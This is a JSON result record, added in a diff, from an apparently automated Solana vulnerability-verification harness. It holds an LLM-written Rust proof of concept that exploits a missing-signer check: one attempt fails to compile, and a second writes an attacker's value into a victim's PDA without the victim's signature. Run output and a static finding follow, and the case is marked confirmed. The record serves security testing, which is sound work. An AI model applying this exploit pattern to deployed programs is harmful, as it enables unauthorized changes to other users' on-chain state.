@@ -1,0 +1,135 @@
+{
+  "category": "SIGNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: PDA da vitima gravou a pubkey da vitima e o value do atacante sem assinatura",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2478,
+        "completion_tokens": 997,
+        "latency_s": 5.82
+      },
+      "raw": "{\n  \"plan\": \"O programa `set_value` (Pinocchio) grava a pubkey de `accounts[1]` (user) e um `value` em um PDA derivado de `[b\\\"data\\\", user.key(), bump]`, sem exigir que `user` assine. O baseline usa um `user` legitimo que assina, com o PDA correto, provando que o cenario esta montado. O ataque repete a mesma chamada mas com um `user` diferente (a vitima) que NAO assina, gravando o `value` do atacante no PDA associado a vitima. O efeito medido e que o PDA da vitima passou a conter a pubkey da vitima e o `value` do atacante, sem que a vitima tenha assinado.\",\n  \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta de dados (PDA) para o usuario legitimo\\nlet legit_user = Pubkey::new_unique();\\nlet (legit_pda, legit_bump) = Pubkey::find_program_address(&[b\\\"data\\\", legit_user.as_ref()], &program_id);\\n\\n// Conta de dados (PDA) para a vitima\\nlet victim = Pubkey::new_unique();\\nlet (victim_pda, victim_bump) = Pubkey::find_program_address(&[b\\\"data\\\", victim.as_ref()], &program_id);\\n\\n// Dados iniciais das contas PDA (8 bytes de discriminador + 32 user + 8 value + 1 bump)\\nlet mut legit_data = vec![0u8; 49];\\nlet mut victim_data = vec![0u8; 49];\\n\\nlet legit_data_account = account(&program_id, &legit_data, None);\\nlet victim_data_account = account(&program_id, &victim_data, None);\\n\\n// Instrucao legitima: user assina\\nlet legit_value: u64 = 111;\\nlet mut legit_ix_data = vec![0u8]; // IX_SET_VALUE\\nlegit_ix_data.push(legit_bump);\\nlegit_ix_data.extend_from_slice(&legit_value.to_le_bytes());\\n\\nlet legit_ix = env.raw_ix(\\n    &legit_ix_data,\\n    &[\\n        AccountMeta::new(legit_pda, false),\\n        AccountMeta::new_readonly(legit_user, true),\\n    ],\\n);\\n\\nlet legit_accounts = [\\n    (legit_pda, legit_data_account.clone()),\\n    (legit_user, wallet(1_000_000_000)),\\n];\\n\\nlet baseline = env.baseline(\\\"set_value legitimo com user assinando\\\", &legit_ix, &legit_accounts);\\n\\n// Ataque: vitima NAO assina, atacante grava seu proprio value no PDA da vitima\\nlet attack_value: u64 = 999;\\nlet mut attack_ix_data = vec![0u8]; // IX_SET_VALUE\\nattack_ix_data.push(victim_bump);\\nattack_ix_data.extend_from_slice(&attack_value.to_le_bytes());\\n\\nlet attack_ix = env.raw_ix(\\n    &attack_ix_data,\\n    &[\\n        AccountMeta::new(victim_pda, false),\\n        AccountMeta::new_readonly(victim, false), // NAO assina\\n    ],\\n);\\n\\nlet attack_accounts = [\\n    (victim_pda, victim_data_account.clone()),\\n    (victim, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.attack(\\\"set_value sem assinatura da vitima\\\", &attack_ix, &attack_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let victim_after = after(&r, &victim_pda);\\n    let stored_user = read_pubkey(victim_after.data(), 8);\\n    let stored_value = read_u64(victim_after.data(), 40);\\n    env.effect(\\n        \\\"PDA da vitima gravou a pubkey da vitima e o value do atacante sem assinatura\\\",\\n        stored_user == victim && stored_value == attack_value,\\n    );\\n}\"\n}",
+      "plan": "O programa `set_value` (Pinocchio) grava a pubkey de `accounts[1]` (user) e um `value` em um PDA derivado de `[b\"data\", user.key(), bump]`, sem exigir que `user` assine. O baseline usa um `user` legitimo que assina, com o PDA correto, provando que o cenario esta montado. O ataque repete a mesma chamada mas com um `user` diferente (a vitima) que NAO assina, gravando o `value` do atacante no PDA associado a vitima. O efeito medido e que o PDA da vitima passou a conter a pubkey da vitima e o `value` do atacante, sem que a vitima tenha assinado.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta de dados (PDA) para o usuario legitimo\nlet legit_user = Pubkey::new_unique();\nlet (legit_pda, legit_bump) = Pubkey::find_program_address(&[b\"data\", legit_user.as_ref()], &program_id);\n\n// Conta de dados (PDA) para a vitima\nlet victim = Pubkey::new_unique();\nlet (victim_pda, victim_bump) = Pubkey::find_program_address(&[b\"data\", victim.as_ref()], &program_id);\n\n// Dados iniciais das contas PDA (8 bytes de discriminador + 32 user + 8 value + 1 bump)\nlet mut legit_data = vec![0u8; 49];\nlet mut victim_data = vec![0u8; 49];\n\nlet legit_data_account = account(&program_id, &legit_data, None);\nlet victim_data_account = account(&program_id, &victim_data, None);\n\n// Instrucao legitima: user assina\nlet legit_value: u64 = 111;\nlet mut legit_ix_data = vec![0u8]; // IX_SET_VALUE\nlegit_ix_data.push(legit_bump);\nlegit_ix_data.extend_from_slice(&legit_value.to_le_bytes());\n\nlet legit_ix = env.raw_ix(\n    &legit_ix_data,\n    &[\n        AccountMeta::new(legit_pda, false),\n        AccountMeta::new_readonly(legit_user, true),\n    ],\n);\n\nlet legit_accounts = [\n    (legit_pda, legit_data_account.clone()),\n    (legit_user, wallet(1_000_000_000)),\n];\n\nlet baseline = env.baseline(\"set_value legitimo com user assinando\", &legit_ix, &legit_accounts);\n\n// Ataque: vitima NAO assina, atacante grava seu proprio value no PDA da vitima\nlet attack_value: u64 = 999;\nlet mut attack_ix_data = vec![0u8]; // IX_SET_VALUE\nattack_ix_data.push(victim_bump);\nattack_ix_data.extend_from_slice(&attack_value.to_le_bytes());\n\nlet attack_ix = env.raw_ix(\n    &attack_ix_data,\n    &[\n        AccountMeta::new(victim_pda, false),\n        AccountMeta::new_readonly(victim, false), // NAO assina\n    ],\n);\n\nlet attack_accounts = [\n    (victim_pda, victim_data_account.clone()),\n    (victim, wallet(1_000_000_000)),\n];\n\nlet r = env.attack(\"set_value sem assinatura da vitima\", &attack_ix, &attack_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let victim_after = after(&r, &victim_pda);\n    let stored_user = read_pubkey(victim_after.data(), 8);\n    let stored_value = read_u64(victim_after.data(), 40);\n    env.effect(\n        \"PDA da vitima gravou a pubkey da vitima e o value do atacante sem assinatura\",\n        stored_user == victim && stored_value == attack_value,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:34:9\n    |\n 32 |       let legit_ix = env.raw_ix(\n    |                          ------ arguments to this method are incorrect\n 33 |           &legit_ix_data,\n 34 | /         &[\n 35 | |             AccountMeta::new(legit_pda, false),\n 36 | |             AccountMeta::new_readonly(legit_user, true),\n 37 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:55:9\n    |\n 53 |       let attack_ix = env.raw_ix(\n    |                           ------ arguments to this method are incorrect\n 54 |           &attack_ix_data,\n 55 | /         &[\n 56 | |             AccountMeta::new(victim_pda, false),\n 57 | |             AccountMeta::new_readonly(victim, false), // NAO assina\n 58 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:34:9\n    |\n 32 |       let legit_ix = env.raw_ix(\n    |                          ------ arguments to this method are incorrect\n 33 |           &legit_ix_data,\n 34 | /         &[\n 35 | |             AccountMeta::new(legit_pda, false),\n 36 | |             AccountMeta::new_readonly(legit_user, true),\n 37 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:55:9\n    |\n 53 |       let attack_ix = env.raw_ix(\n    |                           ------ arguments to this method are incorrect\n 54 |           &attack_ix_data,\n 55 | /         &[\n 56 | |             AccountMeta::new(victim_pda, false),\n 57 | |             AccountMeta::new_readonly(victim, false), // NAO assina\n 58 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3542,
+        "completion_tokens": 932,
+        "latency_s": 4.15
+      },
+      "raw": "{\"plan\": \"Preparo duas contas PDA (uma para o usuario legitimo, outra para a vitima) com dados zerados. O baseline chama set_value legitimamente com o usuario assinando. O ataque chama set_value para o PDA da vitima passando a pubkey da vitima como accounts[1] sem que ela assine. O efeito verifica que o PDA da vitima gravou a pubkey da vitima e o value do atacante, provando que a operacao restrita foi executada sem assinatura.\", \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta de dados (PDA) para o usuario legitimo\\nlet legit_user = Pubkey::new_unique();\\nlet (legit_pda, legit_bump) = Pubkey::find_program_address(&[b\\\"data\\\", legit_user.as_ref()], &program_id);\\n\\n// Conta de dados (PDA) para a vitima\\nlet victim = Pubkey::new_unique();\\nlet (victim_pda, victim_bump) = Pubkey::find_program_address(&[b\\\"data\\\", victim.as_ref()], &program_id);\\n\\n// Dados iniciais das contas PDA (8 bytes de discriminador + 32 user + 8 value + 1 bump)\\nlet legit_data = vec![0u8; 49];\\nlet victim_data = vec![0u8; 49];\\n\\nlet legit_data_account = account(&program_id, &legit_data, None);\\nlet victim_data_account = account(&program_id, &victim_data, None);\\n\\n// Instrucao legitima: user assina\\nlet legit_value: u64 = 111;\\nlet mut legit_ix_data = vec![0u8]; // IX_SET_VALUE\\nlegit_ix_data.push(legit_bump);\\nlegit_ix_data.extend_from_slice(&legit_value.to_le_bytes());\\n\\nlet legit_ix = env.raw_ix(\\n    &legit_ix_data,\\n    vec![\\n        AccountMeta::new(legit_pda, false),\\n        AccountMeta::new_readonly(legit_user, true),\\n    ],\\n);\\n\\nlet legit_accounts = [\\n    (legit_pda, legit_data_account.clone()),\\n    (legit_user, wallet(1_000_000_000)),\\n];\\n\\nlet _baseline = env.baseline(\\\"set_value legitimo com user assinando\\\", &legit_ix, &legit_accounts);\\n\\n// Ataque: vitima NAO assina, atacante grava seu proprio value no PDA da vitima\\nlet attack_value: u64 = 999;\\nlet mut attack_ix_data = vec![0u8]; // IX_SET_VALUE\\nattack_ix_data.push(victim_bump);\\nattack_ix_data.extend_from_slice(&attack_value.to_le_bytes());\\n\\nlet attack_ix = env.raw_ix(\\n    &attack_ix_data,\\n    vec![\\n        AccountMeta::new(victim_pda, false),\\n        AccountMeta::new_readonly(victim, false), // NAO assina\\n    ],\\n);\\n\\nlet attack_accounts = [\\n    (victim_pda, victim_data_account.clone()),\\n    (victim, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.attack(\\\"set_value sem assinatura da vitima\\\", &attack_ix, &attack_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let victim_after = after(&r, &victim_pda);\\n    let stored_user = read_pubkey(victim_after.data(), 8);\\n    let stored_value = read_u64(victim_after.data(), 40);\\n    env.effect(\\n        \\\"PDA da vitima gravou a pubkey da vitima e o value do atacante sem assinatura\\\",\\n        stored_user == victim && stored_value == attack_value,\\n    );\\n}\"}",
+      "plan": "Preparo duas contas PDA (uma para o usuario legitimo, outra para a vitima) com dados zerados. O baseline chama set_value legitimamente com o usuario assinando. O ataque chama set_value para o PDA da vitima passando a pubkey da vitima como accounts[1] sem que ela assine. O efeito verifica que o PDA da vitima gravou a pubkey da vitima e o value do atacante, provando que a operacao restrita foi executada sem assinatura.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta de dados (PDA) para o usuario legitimo\nlet legit_user = Pubkey::new_unique();\nlet (legit_pda, legit_bump) = Pubkey::find_program_address(&[b\"data\", legit_user.as_ref()], &program_id);\n\n// Conta de dados (PDA) para a vitima\nlet victim = Pubkey::new_unique();\nlet (victim_pda, victim_bump) = Pubkey::find_program_address(&[b\"data\", victim.as_ref()], &program_id);\n\n// Dados iniciais das contas PDA (8 bytes de discriminador + 32 user + 8 value + 1 bump)\nlet legit_data = vec![0u8; 49];\nlet victim_data = vec![0u8; 49];\n\nlet legit_data_account = account(&program_id, &legit_data, None);\nlet victim_data_account = account(&program_id, &victim_data, None);\n\n// Instrucao legitima: user assina\nlet legit_value: u64 = 111;\nlet mut legit_ix_data = vec![0u8]; // IX_SET_VALUE\nlegit_ix_data.push(legit_bump);\nlegit_ix_data.extend_from_slice(&legit_value.to_le_bytes());\n\nlet legit_ix = env.raw_ix(\n    &legit_ix_data,\n    vec![\n        AccountMeta::new(legit_pda, false),\n        AccountMeta::new_readonly(legit_user, true),\n    ],\n);\n\nlet legit_accounts = [\n    (legit_pda, legit_data_account.clone()),\n    (legit_user, wallet(1_000_000_000)),\n];\n\nlet _baseline = env.baseline(\"set_value legitimo com user assinando\", &legit_ix, &legit_accounts);\n\n// Ataque: vitima NAO assina, atacante grava seu proprio value no PDA da vitima\nlet attack_value: u64 = 999;\nlet mut attack_ix_data = vec![0u8]; // IX_SET_VALUE\nattack_ix_data.push(victim_bump);\nattack_ix_data.extend_from_slice(&attack_value.to_le_bytes());\n\nlet attack_ix = env.raw_ix(\n    &attack_ix_data,\n    vec![\n        AccountMeta::new(victim_pda, false),\n        AccountMeta::new_readonly(victim, false), // NAO assina\n    ],\n);\n\nlet attack_accounts = [\n    (victim_pda, victim_data_account.clone()),\n    (victim, wallet(1_000_000_000)),\n];\n\nlet r = env.attack(\"set_value sem assinatura da vitima\", &attack_ix, &attack_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let victim_after = after(&r, &victim_pda);\n    let stored_user = read_pubkey(victim_after.data(), 8);\n    let stored_value = read_u64(victim_after.data(), 40);\n    env.effect(\n        \"PDA da vitima gravou a pubkey da vitima e o value do atacante sem assinatura\",\n        stored_user == victim && stored_value == attack_value,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "set_value legitimo com user assinando",
+            "result": "Success",
+            "compute_units": 1824,
+            "account_flags": "-w,sr",
+            "ix_head": "00ff6f0000000000",
+            "accounts": [
+              {
+                "key": "G8xjDo9cSQYsEbjjcdBf6JJt2HXggQwQcwULCUa6NZKW",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "0000000000000000",
+                "digest": "78877fa898f0b4c4",
+                "post": "000000000000000000000000000000020000000000000000000000000000000000000000000000006f00000000000000ff"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "set_value sem assinatura da vitima",
+            "result": "Success",
+            "compute_units": 1824,
+            "account_flags": "-w,-r",
+            "ix_head": "00ffe70300000000",
+            "accounts": [
+              {
+                "key": "GF4B48GT1unAAKsVJaUVf5S8ZEFfXZwNeEX9e96Q87ic",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "0000000000000000",
+                "digest": "78877fa898f0b4c4",
+                "post": "00000000000000000000000000000003000000000000000000000000000000000000000000000000e703000000000000ff"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "PDA da vitima gravou a pubkey da vitima e o value do atacante sem assinatura",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1824 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1824 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: PDA da vitima gravou a pubkey da vitima e o value do atacante sem assinatura"
+    }
+  ],
+  "case_id": "SSP-05-P-V",
+  "static_finding": {
+    "category": "SIGNER",
+    "confidence": "high",
+    "evidence": "let user = &accounts[1];\n...\ndata[8..40].copy_from_slice(user.key().as_ref());",
+    "explanation": "A conta `user` e usada como autoridade (sua chave e gravada no estado da conta de dados), mas nao ha nenhuma verificacao de que ela assinou a transacao. Nao ha uso de `Signer` nem checagem de `user.is_signer`.",
+    "attack_hypothesis": "Um atacante fornece a pubkey de qualquer usuario como `accounts[1]` sem que essa conta assine a transacao, e grava seu proprio `value` no estado associado a esse usuario, pois o PDA e derivado da pubkey fornecida e nao exige assinatura."
+  }
+}
